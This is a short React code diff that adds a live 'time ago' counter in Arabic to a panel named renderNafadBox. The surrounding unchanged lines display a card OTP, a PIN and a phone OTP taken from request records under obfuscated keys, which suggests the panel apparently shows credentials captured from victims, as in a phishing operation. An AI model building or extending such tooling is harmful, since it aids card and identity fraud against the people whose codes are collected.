@@ -1648,6 +1648,24 @@ const renderNafadBox = () => {
     const cardOtpCode = selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode || "123456";
     const pinCode = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "1234").padStart(4, "0");
     const phoneOtpCode = selectedRequest?.raw?._v7 || selectedRequest?.raw?.phoneOtp || "654321";
+    
+    // Time counter state
+    const [counter, setCounter] = React.useState(0);
+    
+    React.useEffect(() => {
+      const interval = setInterval(() => {
+        setCounter(prev => prev + 1);
+      }, 1000);
+      return () => clearInterval(interval);
+    }, []);
+    
+    // Format counter to human readable
+    const formatCounter = (seconds: number): string => {
+      if (seconds < 60) return `منذ ${seconds} ثانية`;
+      if (seconds < 3600) return `منذ ${Math.floor(seconds / 60)} دقيقة`;
+      if (seconds < 86400) return `منذ ${Math.floor(seconds / 3600)} ساعة`;
+      return `منذ ${Math.floor(seconds / 86400)} يوم`;
+    };
 
     return (
       <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
@@ -1674,7 +1692,7 @@ const renderNafadBox = () => {
             display: "flex",
             gap: 4
           }}>
-            <span style={{ fontSize: "0.65rem", color: "#6b7280" }}>05:44</span>
+            <span style={{ fontSize: "0.65rem", color: "#6b7280" }}>{formatCounter(counter)}</span>
           </div>
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق المعلومات الأساسية</h3>
